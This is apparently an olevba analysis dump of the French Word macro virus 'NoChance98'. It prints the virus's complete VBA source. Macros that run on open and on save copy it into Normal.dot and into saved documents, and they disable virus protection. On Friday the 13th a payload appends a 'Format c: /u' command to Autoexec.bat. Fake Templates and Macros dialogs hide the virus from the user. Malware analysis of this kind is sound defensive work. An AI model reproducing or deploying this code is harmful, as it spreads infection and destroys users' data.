olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NoChance98.bas 
in file: Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076 - OLE stream: 'Macros/VBA/NoChance98'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Attribute AutoExec.VB_Description = "Macro créée par ZeMacroKiller98"
Attribute AutoExec.VB_ProcData.VB_Invoke_Func = "Virus.NoChance98.AutoExec"
'
' Macro créée par ZeMacroKiller
' La Charge
Application.EnableCancelKey = wdCancelDisabled  'Disable Ctrl + Attn
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorPayload
Dim MyTime, MyDate, MyWeek
MyDate = Date
D$ = Mid(MyDate, 1, 2)
MyTime = Time
Th$ = Mid(MyTime, 1, 2)
Tm$ = Mid(MyTime, 4, 2)
Ts$ = Mid(MyTime, 7, 2)
MyWeek = WeekDay(MyDate, vbMonday)
If MyWeek = "7" Then
Message:
    MsgBox "On ne travaille pas le Dimanche...", vbExclamation, "C'est Dimanche et j'ai l'intention de me relaxer!"
GoTo Message
End If
If Th$ = "13" Then
    StatusBar = "C'est la CHANCE de ta vie...!!!"
End If
If Tm$ = "13" Then
    StatusBar = "La Chance tourne pour toi...!!!"
End If
If Ts$ = "13" Then
    StatusBar = "Tu as beaucoup de CHANCE...!!!"
End If
If (MyWeek = "5") And (D$ = "13") Then
    MsgBox "Pas de chance pour toi, aujourd'hui...", vbExclamation, "Vendredi 13"
    MsgBox "Je vais formater ton disque dur C: ", vbCritical, "Vendredi 13"
    MsgBox "C'est une blague...", vbInformation, "Vendredi 13"
    MsgBox "HAHAHAHAHA!", vbExclamation, "Vendredi 13"
    MsgBox "Soyez pas supersticieux...", vbExclamation, "Vendredi 13"
    Open "C:\Autoexec.bat" For Append As #1
    Print #1, "Cls"
    Print #1, "@Echo on"
    Print #1, "@Echo Tu te rappelle du message de Word:"
    Print #1, "@Echo Je vais formater votre disque dur C:"
    Print #1, "@Echo C'est pas une blague, c'est la vérité..."
    Print #1, "@Echo N'oublies pas que nous sommes VENDREDI 13..."
    Print #1, "@Echo Dommage pour toi"
    Print #1, "@Echo On y va..."
    Print #1, "@Echo y|Format c: /u"
End If
ErrorPayload:
End Sub
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro créee par ZeMacroKiller98"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Virus.NoChance98.AutoOpen"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorInfectNormalTemplate
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="NoChance98", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
StatusBar = "Virus NoChance98 de ZeMacroKiller"
ErrorInfectNormalTemplate:
End Sub
Sub FileSaveAs()
Attribute FileSaveAs.VB_Description = "Macro créee par ZeMacroKiller98"
Attribute FileSaveAs.VB_ProcData.VB_Invoke_Func = "Virus.NoChance98.FileSaveAs"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
    Dialogs(wdDialogFileSaveAs).Show
On Error GoTo ErrorFSA
If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
    ActiveDocument.SaveAs Fileformat:=wdFormatTemplate
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="NoChance98", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
    ActiveDocument.Save
End If
ErrorFSA:
End Sub
Sub FileTemplates()
Attribute FileTemplates.VB_Description = "Macro créee par ZeMacroKiller98"
Attribute FileTemplates.VB_ProcData.VB_Invoke_Func = "Virus.NoChance98.FileTemplates"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
    UserForm900.Show
ErrorFT:
End Sub
Sub ToolsMacro()
Attribute ToolsMacro.VB_Description = "Macro créee par ZeMacroKiller98"
Attribute ToolsMacro.VB_ProcData.VB_Invoke_Func = "Virus.NoChance98.ToolsMacro"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
    UserForm999.Show
ErrorTM:
End Sub
Sub ViewVBCode()
Attribute ViewVBCode.VB_Description = "Macro créee par ZeMacroKiller98"
Attribute ViewVBCode.VB_ProcData.VB_Invoke_Func = "Virus.NoChance98.ViewVBCode"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm900.frm 
in file: Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076 - OLE stream: 'Macros/VBA/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




Private Sub CommandButton1_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton2_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton3_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton4_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton5_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton6_Click()
Unload UserForm900
End Sub

Private Sub UserForm_Initialize()
    TextBox1.Text = NormalTemplate.Name
    CommandButton2.Enabled = False
    CommandButton3.Enabled = False
    CommandButton4.Enabled = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm999.frm 
in file: Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076 - OLE stream: 'Macros/VBA/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Private Sub ListBox1_Click()
    If ListBox1.Selected(0) = True Then
        CommandButton1.Enabled = True
        CommandButton3.Enabled = True
        CommandButton4.Enabled = True
        CommandButton6.Enabled = True
    ElseIf ListBox1.Selected(1) = True Then
        CommandButton1.Enabled = True
        CommandButton3.Enabled = True
        CommandButton4.Enabled = True
        CommandButton6.Enabled = True
    Else
        CommandButton1.Enabled = False
        CommandButton3.Enabled = False
        CommandButton4.Enabled = False
        CommandButton6.Enabled = False
    End If
End Sub

Private Sub UserForm_Initialize()
    ComboBox1.AddItem "Commande Word"
    ComboBox1.AddItem "Tous les modèles actifs"
    ComboBox1.AddItem "Normal.dot (modèle global)"
    ComboBox1.AddItem WordBasic.WindowName$()
    CommandButton1.Enabled = False
    CommandButton3.Enabled = False
    
End Sub

Private Sub CommandButton1_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub
Private Sub CommandButton2_Click()
Unload UserForm999
End Sub

Private Sub CommandButton3_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

Private Sub CommandButton4_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

Private Sub CommandButton5_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

Private Sub CommandButton6_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

Private Sub CommandButton7_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub
Private Sub ScrollBar1_Change()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Mod�le de document gS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Mise � jour automatique des styles de document
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Mod�les globaux et compl�mentsB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Les �l�ments coch�s sont d�j� en m�moire.ID
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Attacher....D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ajouter
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Supprimer...E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Organiser...E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Annuler
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Chemin d'acc�s:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�,? 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tous les mod�les actifs
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Nom de la macro:0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Macros disponibles dans::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial Narrow
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Description:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ex�cuter
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Annuler
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ex�cuter pas � pas
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Modifier
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Cr�er
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Supprimer
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Organiser...
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar1'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar1'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'Tous les mod\xe8les actifs'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox2'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Virus.MSWord.NoChance-857e00ecc096234e313128b5e6318539cedef076' - OLE stream: 'Macros/UserForm999'
